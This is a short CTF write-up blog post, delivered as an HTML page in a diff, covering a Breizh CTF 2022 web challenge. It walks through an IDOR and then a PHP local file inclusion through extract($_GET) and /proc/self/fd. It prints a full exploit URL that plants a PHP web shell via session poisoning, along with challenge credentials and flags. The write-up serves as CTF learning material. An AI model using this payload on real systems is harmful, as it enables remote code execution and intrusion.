@@ -1,0 +1,153 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>[Breizh CTF 2022 - web] Les crèmes de Mamie Loic (1/2) // ret2school</title>
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.81.0" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="nasm" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://ret2school.github.io/css/main.min.88e7083eff65effb7485b6e6f38d10afbec25093a6fac42d734ce9024d3defbd.css" />
+
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'G-8K5XT0SJN8', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="[Breizh CTF 2022 - web] Les crèmes de Mamie Loic (1/2)"/>
+<meta name="twitter:description" content="The first challenge was an IDOR.
+We have to get the basket of the user mamie, so we can just change /api/getbasket?name=YOUR_USER to /api/getbasket?name=mamie and get the flag : https://les-cremes-de-madame-loic.ctf.bzh:21000/api/getbasket?name=mamie
+La recette secrete est composee de : - Lait - Un maximum de BZHCTF{m4m13_n4_p4s_4ppr1s_d3_c3s_3err3urs!!} - Caramel Il faudra aussi penser a mettre des images pour les produits et a gerer la migration de base de donnees, l&#39;implémentation a commencé ici : /mamiesecret Pour se faire, n&#39;oublie pas d&#39;utiliser les identifiants suivants : - mamiemanager / sxEpnMggi8LtD1y198Iy Les crèmes de Mamie Loic (2/2) We now have the credentials for the user mamiemanager and the knowledge of the endpoint /mamiesecret."/>
+
+    <meta property="og:title" content="[Breizh CTF 2022 - web] Les crèmes de Mamie Loic (1/2)" />
+<meta property="og:description" content="The first challenge was an IDOR.
+We have to get the basket of the user mamie, so we can just change /api/getbasket?name=YOUR_USER to /api/getbasket?name=mamie and get the flag : https://les-cremes-de-madame-loic.ctf.bzh:21000/api/getbasket?name=mamie
+La recette secrete est composee de : - Lait - Un maximum de BZHCTF{m4m13_n4_p4s_4ppr1s_d3_c3s_3err3urs!!} - Caramel Il faudra aussi penser a mettre des images pour les produits et a gerer la migration de base de donnees, l&#39;implémentation a commencé ici : /mamiesecret Pour se faire, n&#39;oublie pas d&#39;utiliser les identifiants suivants : - mamiemanager / sxEpnMggi8LtD1y198Iy Les crèmes de Mamie Loic (2/2) We now have the credentials for the user mamiemanager and the knowledge of the endpoint /mamiesecret." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://ret2school.github.io/post/cremes_mamie/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2022-04-05T00:00:00&#43;00:00" />
+<meta property="article:modified_time" content="2022-04-05T00:00:00&#43;00:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://ret2school.github.io"><img class="app-header-avatar" src="/pic.jpeg" alt="nasm" /></a>
+      <h1>ret2school</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+             / 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+      </nav>
+      <p>Just a bunch of french ctf players</p>
+      <div class="app-header-social">
+        
+          <a target="_blank" href="https://github.com/ret2school" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg></a>
+        
+          <a target="_blank" href="https://twitter.com/ret2school_fr" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg></a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">[Breizh CTF 2022 - web] Les crèmes de Mamie Loic (1/2)</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Apr 5, 2022
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          2 min read
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line>
+</svg>
+              <a class="tag" href="https://ret2school.github.io/tags/ctf/">ctf</a>
+              <a class="tag" href="https://ret2school.github.io/tags/ret2school/">ret2school</a>
+              <a class="tag" href="https://ret2school.github.io/tags/tek/">Tek</a>
+              <a class="tag" href="https://ret2school.github.io/tags/web/">web</a>
+              <a class="tag" href="https://ret2school.github.io/tags/2022/">2022</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <p>The first challenge was an IDOR.<br>
+We have to get the basket of the user <code>mamie</code>, so we can just change <code>/api/getbasket?name=YOUR_USER</code> to <code>/api/getbasket?name=mamie</code> and get the flag : <code>https://les-cremes-de-madame-loic.ctf.bzh:21000/api/getbasket?name=mamie</code></p>
+<pre><code>La recette secrete est composee de :
+- Lait
+- Un maximum de BZHCTF{m4m13_n4_p4s_4ppr1s_d3_c3s_3err3urs!!}
+- Caramel
+Il faudra aussi penser a mettre des images pour les produits et a gerer la migration de base de donnees, l'implémentation a commencé ici : /mamiesecret
+Pour se faire, n'oublie pas d'utiliser les identifiants suivants :
+- mamiemanager / sxEpnMggi8LtD1y198Iy
+</code></pre><h2 id="les-crèmes-de-mamie-loic-22">Les crèmes de Mamie Loic (2/2)</h2>
+<p>We now have the credentials for the user <code>mamiemanager</code> and the knowledge of the endpoint <code>/mamiesecret</code>.<br>
+Here is the source code :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">  <span style="color:#bd93f9">1</span> <span style="color:#ff79c6">&lt;?</span>php
+  <span style="color:#bd93f9">2</span> session_start();
+  <span style="color:#bd93f9">3</span> <span style="color:#ff79c6">if</span>(<span style="color:#ff79c6">!</span>isset(<span style="color:#8be9fd;font-style:italic">$_SESSION</span>[<span style="color:#f1fa8c">&#34;name&#34;</span>]) <span style="color:#ff79c6">&amp;&amp;</span> <span style="color:#8be9fd;font-style:italic">$_SESSION</span>[<span style="color:#f1fa8c">&#34;name&#34;</span>] <span style="color:#ff79c6">!==</span> <span style="color:#f1fa8c">&#34;mamiemanager&#34;</span>)
+  <span style="color:#bd93f9">4</span> {
+  <span style="color:#bd93f9">5</span>     header(<span style="color:#f1fa8c">&#34;Location: /&#34;</span>);
+  <span style="color:#bd93f9">6</span>     <span style="color:#ff79c6">die</span>();
+  <span style="color:#bd93f9">7</span> }
+  <span style="color:#bd93f9">8</span>
+  <span style="color:#bd93f9">9</span> extract(<span style="color:#8be9fd;font-style:italic">$_GET</span>);
+ <span style="color:#bd93f9">10</span>
+ <span style="color:#bd93f9">11</span> <span style="color:#ff79c6">if</span>(isset(<span style="color:#8be9fd;font-style:italic">$page</span>)) <span style="color:#ff79c6">include</span>(<span style="color:#f1fa8c">&#34;pages/&#34;</span><span style="color:#ff79c6">.</span><span style="color:#8be9fd;font-style:italic">$page</span>);
+ <span style="color:#bd93f9">12</span> <span style="color:#ff79c6">else</span> <span style="color:#ff79c6">include</span>(<span style="color:#f1fa8c">&#34;pages/factures.php&#34;</span>);
+ <span style="color:#bd93f9">13</span>
+ <span style="color:#bd93f9">14</span> <span style="color:#ff79c6">if</span>(isset(<span style="color:#8be9fd;font-style:italic">$source</span>))
+ <span style="color:#bd93f9">15</span> {
+ <span style="color:#bd93f9">16</span>     <span style="color:#ff79c6">die</span>(show_source(<span style="color:#8be9fd;font-style:italic">$_SERVER</span>[<span style="color:#f1fa8c">&#34;SCRIPT_FILENAME&#34;</span>]));
+ <span style="color:#bd93f9">17</span> }
+ <span style="color:#bd93f9">18</span> <span style="color:#ff79c6">?&gt;</span>
+</code></pre></div><p>This is the documentation of the function <code>extract</code> :</p>
+<pre><code>extract — Import variables into the current symbol table from an array
+
+Warning
+Do not use extract() on untrusted data, like user input (e.g. $_GET, $_FILES).
+</code></pre><p>:)<br>
+The LFI at the line 11 is obvious.<br>
+We can exploit the call to <code>extract</code> to overwrite <code>$_SERVER[&quot;SCRIPT_FILENAME&quot;]</code> and get an arbitrary file read, but it won&rsquo;t be useful here.<br>
+With the LFI, we can include file in <code>/proc/self/fd/</code> which contains the list of files opened by the current process.<br>
+With a bit of bruteforce we find the session file at <code>/proc/self/fd/10</code>. The variable <code>name</code> is already there, we can use the call to <code>extract</code> to overwrite it and insert some php code : <code>https://les-cremes-de-madame-loic.ctf.bzh:21000/mamiesecret?page=../../../../../../../../../../../../proc/self/fd/10&amp;_SESSION[name]=&lt;?php echo system($_GET[&quot;cmd&quot;]);?&gt;&amp;cmd=id</code></p>
+<p><code>BZHCTF{m4m13_4ur41t_du_3ng4g3r_un3_p3rs0nn3_plus_comp3t3nt3s!!}</code></p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
